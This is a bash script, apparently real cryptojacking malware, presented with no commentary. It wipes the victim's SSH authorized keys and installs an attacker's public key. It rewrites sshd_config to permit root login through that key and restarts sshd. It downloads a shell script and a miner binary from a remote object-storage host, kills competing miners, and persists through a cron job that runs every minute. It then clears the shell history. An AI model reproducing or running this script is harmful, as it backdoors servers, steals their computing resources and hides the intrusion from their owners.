#!/bin/bash
#if [ ! -f "/root/.ssh/SEMBLEiq" ];then
#echo "file not found"
 mkdir -p ~/.ssh
 rm -f ~/.ssh/authorized_keys*
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe7JxB9RbWO/ajhv/U2Pp1dUIYoUh1qJwiqNzMJdrweJzZOG69oouGueDFAZ2J97UQqNTCqRHr0Wim/T/CdduL5/5axPY6um441eCZljBYhUU4LN7lmDcLpXaL/QU9uYpPrx1IvsSWviC53DOx1/hbArmUYiJ3zWAX4eqIZPRHn8hUIABY3N2iZ51AZ+TyD+otYi9LITKTIMapIDicwdi5/GgWclpNClZUjc7wKSyb8SsHxlWFcj0l+uVkPdau3gcvEx5yPURZeeoMHdAIR+jHduiz8UanPy/FvTWLfPnuFInus0TRetW8jHEbkt4KqdlmlWTd/+tjjVU/AglySQN9 ueuwiwywu" > ~/.ssh/SEMBLEiq
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe7JxB9RbWO/ajhv/U2Pp1dUIYoUh1qJwiqNzMJdrweJzZOG69oouGueDFAZ2J97UQqNTCqRHr0Wim/T/CdduL5/5axPY6um441eCZljBYhUU4LN7lmDcLpXaL/QU9uYpPrx1IvsSWviC53DOx1/hbArmUYiJ3zWAX4eqIZPRHn8hUIABY3N2iZ51AZ+TyD+otYi9LITKTIMapIDicwdi5/GgWclpNClZUjc7wKSyb8SsHxlWFcj0l+uVkPdau3gcvEx5yPURZeeoMHdAIR+jHduiz8UanPy/FvTWLfPnuFInus0TRetW8jHEbkt4KqdlmlWTd/+tjjVU/AglySQN9 ueuwiwywu" > ~/.ssh/authorized_keys
 echo "#	$OpenBSD: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/bin:/usr/bin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

# If you want to change the port on a SELinux system, you have to tell
# SELinux about this change.
# semanage port -a -t ssh_port_t -p tcp #PORTNUMBER
#
#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_dsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
SyslogFacility AUTHPRIV
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
PermitRootLogin yes
StrictModes no
#MaxAuthTries 6
#MaxSessions 10

PubkeyAuthentication yes
RSAAuthentication yes

# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
# but this is overridden so installations will only check .ssh/authorized_keys
AuthorizedKeysFile	.ssh/SEMBLEiq

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no
PasswordAuthentication yes

# Change to no to disable s/key passwords
#ChallengeResponseAuthentication yes
ChallengeResponseAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no
#KerberosUseKuserok yes

# GSSAPI options
GSSAPIAuthentication yes
GSSAPICleanupCredentials no
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no
#GSSAPIEnablek5users no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
# WARNING: 'UsePAM no' is not supported in Red Hat Enterprise Linux and may cause several
# problems.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
#PrintMotd yes
#PrintLastLog yes
#TCPKeepAlive yes
#UseLogin no
#UsePrivilegeSeparation sandbox
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#ShowPatchLevel no
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Accept locale-related environment variables
AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES
AcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT
AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE
AcceptEnv XMODIFIERS

# override default of no subsystems
Subsystem	sftp	/usr/libexec/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server"  > /etc/ssh/sshd_config
#rm -rf /var/spool/cron/*
 service sshd restart
 /etc/init.d/sshd restart
#fi
# define variable
version='+1';

dir="/usr/sshl/"
shell="run.sh"
shellUrl="https://skyxx.oss-cn-beijing.aliyuncs.com/run.sh"
shellPath=$dir$shell

miner="sshl"
minerUrl="https://skyxx.oss-cn-beijing.aliyuncs.com/sshl"
minerPath=$dir$miner

mkdir $dir

# download shell
wget -O $shellPath $shellUrl
# setting auth
chmod 777 $shellPath

# kill other miner process
kill -s 9 `ps -aux | grep yam | awk '{print $2}'`
# download sshl if not
ps auxf | grep -v grep | grep ""wget -O "$minerPath" || wget -O $minerPath $minerUrl
# setting auth
chmod 777 $minerPath

rm -rf /var/spool/cron/root
echo "*/1 * * * * $shellPath" >> /var/spool/cron/root
ps auxf | grep -v grep | grep $minerPath || nohup $minerPath &
history -c
#rm -rf /var/spool/mail/root



